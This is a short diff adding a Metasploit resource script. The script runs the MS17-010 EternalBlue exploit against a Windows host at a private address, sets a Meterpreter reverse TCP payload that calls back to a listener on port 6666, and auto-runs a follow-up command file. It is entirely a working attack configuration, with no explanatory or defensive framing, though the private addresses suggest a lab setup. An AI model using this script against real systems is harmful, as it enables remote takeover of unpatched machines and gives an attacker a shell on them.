@@ -1,0 +1,7 @@
+use exploit/windows/smb/ms17_010_eternalblue
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set RHOST 192.168.252.129
+set LHOST 192.168.252.128
+set LPORT 6666
+set AutoRunScript 'multi_console_command -r "run.txt"'
+exploit -z
